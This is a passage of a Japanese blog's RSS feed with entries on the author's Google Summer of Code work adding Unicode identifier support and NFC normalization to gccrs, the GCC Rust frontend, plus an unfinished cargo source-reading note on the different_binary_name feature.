&lt;li&gt;lexer/parserの&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%EA%A5%D5%A5%A1%A5%AF%A5%BF%A5%EA%A5%F3%A5%B0&quot;&gt;リファクタリング&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;識別子への位置情報の追加&lt;/li&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Unicode&quot;&gt;Unicode&lt;/a&gt;の&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/NFC&quot;&gt;NFC&lt;/a&gt;正規化&lt;/li&gt;
&lt;/ul&gt;


&lt;h2 id=&quot;UTF-8識別子のトークナイズ&quot;&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/UTF-8&quot;&gt;UTF-8&lt;/a&gt;識別子の&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%C8%A1%BC%A5%AF&quot;&gt;トーク&lt;/a&gt;ナイズ&lt;/h2&gt;

&lt;p&gt;Rustでは識別子は以下のような&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%C0%B5%B5%AC%C9%BD%B8%BD&quot;&gt;正規表現&lt;/a&gt;で表されます。&lt;/p&gt;

&lt;pre class=&quot;code&quot; data-lang=&quot;&quot; data-unlink&gt;(XID_Start | &amp;#39;_&amp;#39;) XID_Continue*&lt;/pre&gt;


&lt;p&gt;XID_StartとXID_Continueはそれぞれ英語アルファベットと英数字を拡張した属性と思っていただけると良いです。これらの属性は&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Unicode&quot;&gt;Unicode&lt;/a&gt;のデータベースの一つである&lt;a href=&quot;https://unicode.org/Public/UNIDATA/DerivedCoreProperties.txt&quot;&gt;DerivedCoreProperties.txt&lt;/a&gt;をルックアップすることで調べることができます。&lt;/p&gt;

&lt;p&gt;これまで、gccrsは生文字列&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%EA%A5%C6%A5%E9%A5%EB&quot;&gt;リテラル&lt;/a&gt; (&lt;code&gt;r#&quot;...&quot;#&lt;/code&gt;)はサポートしていたため、部分的に&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/UTF-8&quot;&gt;UTF-8&lt;/a&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%C7%A5%B3%A1%BC%A5%C0&quot;&gt;デコーダ&lt;/a&gt;が使われていました。
この&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%C7%A5%B3%A1%BC%A5%C0&quot;&gt;デコーダ&lt;/a&gt;を識別子を&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%C8%A1%BC%A5%AF&quot;&gt;トーク&lt;/a&gt;ナイズする際にも使うようにしました。&lt;/p&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Unicode&quot;&gt;Unicode&lt;/a&gt;では、各文字に対して、一意の数であるコードポイントを定義しています。
もともと、コードポイントと属性のテーブルはlibcppという&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GCC&quot;&gt;GCC&lt;/a&gt;のC&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%D7%A5%EA%A5%D7%A5%ED%A5%BB%A5%C3%A5%B5&quot;&gt;プリプロセッサ&lt;/a&gt;のコード上に存在していました。これを活用するために、libcppにテーブルを二部探索する関数を追加し、gccrsにリンクするようにしました。&lt;/p&gt;

&lt;h2 id=&quot;lexerparserのリファクタリング&quot;&gt;lexer/parserの&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%EA%A5%D5%A5%A1%A5%AF%A5%BF%A5%EA%A5%F3%A5%B0&quot;&gt;リファクタリング&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/UTF-8&quot;&gt;UTF-8&lt;/a&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%C7%A5%B3%A1%BC%A5%C0&quot;&gt;デコーダ&lt;/a&gt;がlexerの一部でしか使えなかったので、ファイルから&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9&quot;&gt;ソースコード&lt;/a&gt;を読み込む時点でデコードを行うように改修しました。
lexer内ではcharを使って1つの文字を表していたため、全てしらみつぶしに置き換えるのが大変でした。&lt;/p&gt;

&lt;p&gt;Rustはセルフホストしているため、このような明示的な&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/UTF-8&quot;&gt;UTF-8&lt;/a&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%C7%A5%B3%A1%BC%A5%C0&quot;&gt;デコーダ&lt;/a&gt;が&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;にないのが面白いです。&lt;/p&gt;

&lt;h2 id=&quot;識別子への位置情報の追加&quot;&gt;識別子への位置情報の追加&lt;/h2&gt;

&lt;p&gt;識別子の位置情報とは、ファイル名や行番号、列番号のことです。
これまでgccrs内部では、識別子と位置情報がデータ構造として一緒に扱われていませんでした。
そのためエラー出力(diagnostics)がユーザーに優しくないという短所がありました。
イメージとしては以下のような感じです。&lt;/p&gt;

&lt;p&gt;before:&lt;/p&gt;

&lt;pre class=&quot;code&quot; data-lang=&quot;&quot; data-unlink&gt;fn main() { ...
^
error: hoge&lt;/pre&gt;


&lt;p&gt;after:&lt;/p&gt;

&lt;pre class=&quot;code&quot; data-lang=&quot;&quot; data-unlink&gt;fn main() { ...
   ^^^^
   error: hoge
&lt;/pre&gt;


&lt;p&gt;この作業自体は&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Unicode&quot;&gt;Unicode&lt;/a&gt;対応とは関係ありませんが、gccrsの予てからの課題だったので取り組みました。
パーサーやASTまわりのコードだけで数千~数万行あるので大変かと思っていましたが、意外と百行程度の変更で済みました。&lt;/p&gt;

&lt;h2 id=&quot;UnicodeのNFC正規化&quot;&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Unicode&quot;&gt;Unicode&lt;/a&gt;の&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/NFC&quot;&gt;NFC&lt;/a&gt;正規化&lt;/h2&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Unicode&quot;&gt;Unicode&lt;/a&gt;のUAX#15という仕様書の中で、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Unicode&quot;&gt;Unicode&lt;/a&gt;のバイト列の正規化方法が定義されています。
正規化をすることで、同じように見えるがバイト列が異なる文字列を同じバイト列に変換することができ、文字列比較が簡単になります。&lt;/p&gt;

&lt;p&gt;以下は正規化の例で、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/NFC&quot;&gt;NFC&lt;/a&gt;以外にもNFD, NFKC, NFKDの三種類があります。(気になった方は調べてみてください。)&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://unicode.org/reports/tr15/images/UAX15-NormFig5.jpg&quot; class=&quot;http-image&quot;&gt;&lt;img src=&quot;https://unicode.org/reports/tr15/images/UAX15-NormFig5.jpg&quot; class=&quot;http-image&quot; alt=&quot;https://unicode.org/reports/tr15/images/UAX15-NormFig5.jpg&quot;&gt;&lt;/a&gt;
&lt;a href=&quot;https://unicode.org/reports/tr15/&quot;&gt;https://unicode.org/reports/tr15/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Rustは&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9&quot;&gt;ソースコード&lt;/a&gt;に現れる識別子を&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/NFC&quot;&gt;NFC&lt;/a&gt;という形式に正規化することを定めています。
(ハングルを除く)文字列の正規化を行うはすでに実装できているため、今後はこれをパーサーに載せる予定です。
ちなみに、正規化においてハングルは音節文字の分解・合成を効率的に処理するため特別扱いされます。&lt;/p&gt;

&lt;p&gt;実装には、正規化のリファレンス実装である&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/W3C&quot;&gt;W3C&lt;/a&gt;の&lt;a href=&quot;https://www.w3.org/International/charlint/&quot;&gt;Charlint&lt;/a&gt;を参考にしました。
10年前からメンテされていなくて最新版の&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Unicode&quot;&gt;Unicode&lt;/a&gt;に対応していないので、パッチを送ろうかと思っています。&lt;/p&gt;

&lt;p&gt;また、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Unicode&quot;&gt;Unicode&lt;/a&gt;データベースを利用するために、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Python&quot;&gt;Python&lt;/a&gt;で&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/C%2B%2B&quot;&gt;C++&lt;/a&gt;のヘッダーファイルのジェネレータを作りました。&lt;/p&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2FRust-GCC%2Fgccrs%2Fblob%2F66936f7c3d3fe6a04abf346cc4a0fe025c238419%2Fgcc%2Frust%2Futil%2Fmake-rust-unicode.py%23L1&quot; title=&quot;gccrs/gcc/rust/util/make-rust-unicode.py at 66936f7c3d3fe6a04abf346cc4a0fe025c238419 · Rust-GCC/gccrs&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://github.com/Rust-GCC/gccrs/blob/66936f7c3d3fe6a04abf346cc4a0fe025c238419/gcc/rust/util/make-rust-unicode.py#L1&quot;&gt;github.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;h2 id=&quot;これから&quot;&gt;これから&lt;/h2&gt;

&lt;p&gt;今後はナイーブな正規化の実装の最適化や、name manglingに必要な&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Punycode&quot;&gt;Punycode&lt;/a&gt;変換の実装を行っていく予定です。&lt;/p&gt;
</description>          <pubDate>Mon, 17 Jul 2023 20:07:02 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/820878482950609429</guid>
          
          <enclosure url="https://cdn.image.st-hatena.com/image/scale/9e864bb85cec0c38ca0f4f7dfe460e0b3ce6a562/backend=imagemagick;version=1;width=1300/https%3A%2F%2Funicode.org%2Freports%2Ftr15%2Fimages%2FUAX15-NormFig5.jpg" type="image/jpeg" length="0" />
        </item>
      
    
      
      
        <item>
          <title>GSoC2023 (GCC) に参加します</title>
          <link>https://tamaron.hatenablog.com/entry/2023/05/06/192144</link>          <description>&lt;h1 id=&quot;TLDR&quot;&gt;TL;DR&lt;/h1&gt;

&lt;p&gt;&lt;blockquote data-conversation=&quot;none&quot; class=&quot;twitter-tweet&quot; data-lang=&quot;en&quot;&gt;&lt;p lang=&quot;ja&quot; dir=&quot;ltr&quot;&gt;GSoC通りました！&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GCC&quot;&gt;GCC&lt;/a&gt;のRust frontendの&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Unicode&quot;&gt;Unicode&lt;/a&gt;サポートをする予定です &lt;a href=&quot;https://t.co/8gCfPMapTm&quot;&gt;pic.twitter.com/8gCfPMapTm&lt;/a&gt;&lt;/p&gt;&amp;mdash; tamaron (@tamaroning) &lt;a href=&quot;https://twitter.com/tamaroning/status/1654300844110807040?ref_src=twsrc%5Etfw&quot;&gt;May 5, 2023&lt;/a&gt;&lt;/blockquote&gt; &lt;script async src=&quot;https://platform.twitter.com/widgets.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Google&quot;&gt;Google&lt;/a&gt; &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Summer%20of%20Code&quot;&gt;Summer of Code&lt;/a&gt;に提出したproposalが採択されました&lt;/li&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GCC&quot;&gt;GCC&lt;/a&gt;のRustフロントエンドに対する&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Unicode&quot;&gt;Unicode&lt;/a&gt;サポートを追加します&lt;/li&gt;
&lt;/ul&gt;


&lt;h1 id=&quot;GSoCとは&quot;&gt;GSoCとは&lt;/h1&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Google&quot;&gt;Google&lt;/a&gt; が毎年夏休みに主催する主に学生(※1)向けのプログラムです。学生は GSoC に参加する&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/OSS&quot;&gt;OSS&lt;/a&gt;組織にプロジェクトの提案書を送り、無事採択されれば、各組織のメンターの下、約12週間の間&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%AA%A1%BC%A5%D7%A5%F3%A5%BD%A1%BC%A5%B9&quot;&gt;オープンソース&lt;/a&gt;の開発を行います。年度、居住国によりますが、中規模、大規模なプロジェクトに対して、それぞれ 2700USD、5400USD の報酬がもらえます。&lt;/p&gt;

&lt;p&gt;※1: 最近では学生以外でも応募する資格があります&lt;/p&gt;

&lt;h1 id=&quot;私のプロジェクトについて&quot;&gt;私のプロジェクトについて&lt;/h1&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GCC&quot;&gt;GCC&lt;/a&gt; は C や &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/C%2B%2B&quot;&gt;C++&lt;/a&gt; をはじめとして、様々な言語のフロントエンドが存在します。その中の一つに Rust フロントエンド (&lt;a href=&quot;https://github.com/Rust-GCC/gccrs&quot;&gt;gccrs&lt;/a&gt;) があります。既存の Rustc を用いずに&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;自体を&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB&quot;&gt;コンパイル&lt;/a&gt;するために&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9&quot;&gt;ソースコード&lt;/a&gt;は &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/C%2B%2B&quot;&gt;C++&lt;/a&gt; で書かれています。&lt;/p&gt;

&lt;p&gt;私のプロジェクトの主な目的は、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GCC&quot;&gt;GCC&lt;/a&gt; の Rust フロントエンドが &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Unicode&quot;&gt;Unicode&lt;/a&gt; の識別子を&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB&quot;&gt;コンパイル&lt;/a&gt;できるようにすることです。最近の&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0%B8%C0%B8%EC&quot;&gt;プログラミング言語&lt;/a&gt;の識別子は &lt;a href=&quot;https://unicode.org/reports/tr31/&quot;&gt;UAX#31&lt;/a&gt; に準拠していることが多く、ACII 以外の &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Unicode&quot;&gt;Unicode&lt;/a&gt; 文字を使うことができます。そのため、このプロジェクトでは&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%B9%BD%CA%B8%B2%F2%C0%CF&quot;&gt;構文解析&lt;/a&gt;器 (parser) と字句解析器 (lexer) を中心に&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9&quot;&gt;ソースコード&lt;/a&gt;に手を加えることになりますが、Rust&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;に要求される識別子の正規化や一部の属性に対する追加のチェックも実装する必要があります。さらに、&lt;a href=&quot;https://rust-lang.github.io/rfcs/2603-rust-symbol-name-mangling-v0.html&quot;&gt;name mangling&lt;/a&gt; などバックエンドに近いところまで影響が波及し、とても面白いプロジェクトだと思います。&lt;/p&gt;

&lt;h1 id=&quot;採択されるまで&quot;&gt;採択されるまで&lt;/h1&gt;

&lt;p&gt;昨年の11月に初めてコントリビュートしました。最初はチームの方々に、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/IRC&quot;&gt;IRC&lt;/a&gt;でビルドやエディタの設定などを教えてもらいながらやったことを覚えています。それまで&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/C%2B%2B&quot;&gt;C++&lt;/a&gt;を全く書いたことがなかったので、勉強のためにリンカを自作したりもしました。&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/C%2B%2B&quot;&gt;C++&lt;/a&gt;やコードベースに少しずつ慣れてきたら、ちゃんとした大きさの&lt;a href=&quot;https://github.com/Rust-GCC/gccrs/pull/1708&quot;&gt;パッチ&lt;/a&gt;にも取り組みました。&lt;/p&gt;

&lt;p&gt;今年の2月に&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GCC&quot;&gt;GCC&lt;/a&gt;のア&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A4%A5%C7%A5%A2&quot;&gt;イデア&lt;/a&gt;リストが公開されたので、2月中にproposalを大体書き終えて、メンターの方にレビューを頂きました。3月は&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GCC&quot;&gt;GCC&lt;/a&gt;の&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%E1%A1%BC%A5%EA%A5%F3%A5%B0%A5%EA%A5%B9%A5%C8&quot;&gt;メーリングリスト&lt;/a&gt;にproposalを投げて、開発者の方々から頂いた意見などをもとに修正を行いました。最後に英語のライティングにあまり自信がなかったので、学科のガチプロである &lt;a href=&quot;https://twitter.com/southball02&quot;&gt;@southball&lt;/a&gt; さんに校正をしてもらいました。(本当にありがとうございます。)&lt;/p&gt;

&lt;h1 id=&quot;今後応募する方に向けて&quot;&gt;今後応募する方に向けて&lt;/h1&gt;

&lt;p&gt;私の proposal は以下にあります。個人的にア&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A4%A5%C7%A5%A2&quot;&gt;イデア&lt;/a&gt;の技術的な詳細や見通しのよい細かい計画を書くこととメンターとコミュニケーションを取ることが大切だと感じました。他に、私はCVに過去の&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/OSS&quot;&gt;OSS&lt;/a&gt;コントリビューションについても記載しましたが、これも書いておいたほうが良いと思います。&lt;/p&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fdocs.google.com%2Fdocument%2Fd%2F1sisJEyId1WB0SXxjynEN50qhFcvpHDL-1543dcZZZPA%2Fedit%3Fusp%3Dsharing&quot; title=&quot;(Pub) GSoC2023 proposal  &quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://docs.google.com/document/d/1sisJEyId1WB0SXxjynEN50qhFcvpHDL-1543dcZZZPA/edit?usp=sharing&quot;&gt;docs.google.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;過去に GSoC に参加された方が公開している proposal もとても参考になりました。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://maekawatoshiki.github.io/posts/gsoc1/&quot;&gt;https://maekawatoshiki.github.io/posts/gsoc1/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.google.com/document/d/1Rlo0RFGsF_UCBhZBV-63spdWq9PR9NmBApdMGSaHLCU/edit&quot;&gt;https://docs.google.com/document/d/1Rlo0RFGsF_UCBhZBV-63spdWq9PR9NmBApdMGSaHLCU/edit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://okuraofvegetable.hatenablog.com/entry/gsoc-2020-apply&quot;&gt;https://okuraofvegetable.hatenablog.com/entry/gsoc-2020-apply&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://momoka0122y.hatenablog.com/entry/2022/05/26/232604&quot;&gt;https://momoka0122y.hatenablog.com/entry/2022/05/26/232604&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;h1 id=&quot;さいごに&quot;&gt;さいごに&lt;/h1&gt;

&lt;p&gt;2回の evaluation を通せるように頑張ります！&lt;/p&gt;
</description>          <pubDate>Sat, 06 May 2023 19:21:44 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/4207575160646324250</guid>
          
          <enclosure url="https://ogimage.blog.st-hatena.com/26006613542645241/4207575160646324250/1683368504" type="image/png" length="0" />
        </item>
      
    
      
      
        <item>
          <title>rust-lang/cargo ソースコードリーディング</title>
          <link>https://tamaron.hatenablog.com/entry/2021/12/11/121712</link>          <description>&lt;h1&gt;はじめに&lt;/h1&gt;

&lt;p&gt;cargoにはバイナリの名前をパッケージ名と異なるものにする機能がある。
この機能はcargo-feature &lt;code&gt;different_binary_name&lt;/code&gt;という。&lt;/p&gt;

&lt;p&gt;Cargo.tomlに以下を追記すると、cargo buildで出力されるバイナリは&lt;code&gt;piyo&lt;/code&gt;になる。&lt;/p&gt;

&lt;pre class=&quot;code yml&quot; data-lang=&quot;yml&quot; data-unlink&gt;[[bin]]
name = &amp;#34;piyo&amp;#34;
path = &amp;#34;src/piyo.rs&amp;#34;&lt;/pre&gt;


&lt;p&gt;この機能は以下のIssueで提案され採用された。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;[Issue] &lt;a href=&quot;https://github.com/rust-lang/cargo/issues/1706&quot;&gt;Ability to specify the output name for a bin target different from the crate name #1706&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;[PR] &lt;a href=&quot;https://github.com/rust-lang/cargo/pull/9627&quot;&gt;Ability to specify the output name for a bin target different from the crate name #9627&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;h1&gt;基本事項&lt;/h1&gt;

&lt;p&gt;この記事はこのPRをもとにrust-lang/cargoの&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9&quot;&gt;ソースコード&lt;/a&gt;を読んでわかったことをまとめたものである。もともと自分用メモだったので、汚いのはご容赦ください、&lt;/p&gt;

&lt;p&gt;まず、ファイル名の出力に関しての基本事項を以下に示した。これはコードを読み進めてわかったことだが、本記事ではこれらをもとに&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9&quot;&gt;ソースコード&lt;/a&gt;を見ていく。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Target&lt;/code&gt;構造体: 全体のconfig情報を管理する&lt;/li&gt;
&lt;li&gt;&lt;code&gt;OutputFile&lt;/code&gt;構造体: 出力ファイルごとに作られる構造体

&lt;ul&gt;
&lt;li&gt;出力先パスの情報&lt;/li&gt;
&lt;li&gt;ハードリンクに関する情報&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;h2&gt;PRで提案された手法&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Cargo.tomlからバイナリ名を取得&lt;/li&gt;
&lt;li&gt;バイナリ名が指定されていない =&gt; 従来通り、パッケージ名を使う。&lt;/li&gt;
&lt;li&gt;バイナリ名指定あり =&gt; Target構造体にそのバイナリ名を持たせる&lt;/li&gt;
&lt;/ul&gt;


&lt;h2&gt;ハードリンクに関して&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;cargo build&lt;/code&gt;すると、バイナリはtarget/debugに作られるが、バイナリの実体はそれより下の階層(target/debug/depsなど)にある。
targetの階層につくられるバイナリは実はハードリンクである。&lt;/p&gt;

&lt;h1&gt;実際に読む&lt;/h1&gt;

&lt;p&gt;Targetはバイナリやライブラリの情報を一括してもつ。
&lt;code&gt;Target.bin_name&lt;/code&gt;は&lt;code&gt;different_binary_name&lt;/code&gt;を実現するためにあるフィールド。&lt;/p&gt;

&lt;pre class=&quot;code lang-rust&quot; data-lang=&quot;rust&quot; data-unlink&gt;&lt;span class=&quot;synComment&quot;&gt;// src/cargo/core/manifest.rs&lt;/span&gt;

&lt;span class=&quot;synComment&quot;&gt;// Information about a binary, a library, an example, etc. that is&lt;/span&gt;
&lt;span class=&quot;synComment&quot;&gt;// part of the package.&lt;/span&gt;
&lt;span class=&quot;synStatement&quot;&gt;pub&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;Target&lt;/span&gt; {
    inner: Arc&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;TargetInner&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;,
}

&lt;span class=&quot;synStatement&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;TargetInner&lt;/span&gt; {
    kind: TargetKind,
    name: &lt;span class=&quot;synType&quot;&gt;String&lt;/span&gt;,
    &lt;span class=&quot;synComment&quot;&gt;// Note that `bin_name` is used for the cargo-feature `different_binary_name`&lt;/span&gt;
    &lt;span class=&quot;synComment&quot;&gt;// Some(..)ならば、[[bin]]でバイナリ名が指定されている&lt;/span&gt;
    &lt;span class=&quot;synComment&quot;&gt;// Noneならば、バイナリ名が指定されていない&lt;/span&gt;
    bin_name: &lt;span class=&quot;synType&quot;&gt;Option&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;synType&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;,
    &lt;span class=&quot;synComment&quot;&gt;// Note that the `src_path` here is excluded from the `Hash` implementation&lt;/span&gt;
    &lt;span class=&quot;synComment&quot;&gt;// as it&#39;s absolute currently and is otherwise a little too brittle for&lt;/span&gt;
    &lt;span class=&quot;synComment&quot;&gt;// causing rebuilds. Instead the hash for the path that we send to the&lt;/span&gt;
    &lt;span class=&quot;synComment&quot;&gt;// compiler is handled elsewhere.&lt;/span&gt;
    src_path: TargetSourcePath,
    required_features: &lt;span class=&quot;synType&quot;&gt;Option&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;synType&quot;&gt;Vec&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;synType&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;,
    tested: &lt;span class=&quot;synType&quot;&gt;bool&lt;/span&gt;,
    benched: &lt;span class=&quot;synType&quot;&gt;bool&lt;/span&gt;,
    doc: &lt;span class=&quot;synType&quot;&gt;bool&lt;/span&gt;,
    doctest: &lt;span class=&quot;synType&quot;&gt;bool&lt;/span&gt;,
    harness: &lt;span class=&quot;synType&quot;&gt;bool&lt;/span&gt;, &lt;span class=&quot;synComment&quot;&gt;// whether to use the test harness (--test)&lt;/span&gt;
    for_host: &lt;span class=&quot;synType&quot;&gt;bool&lt;/span&gt;,
    proc_macro: &lt;span class=&quot;synType&quot;&gt;bool&lt;/span&gt;,
    edition: Edition,
}

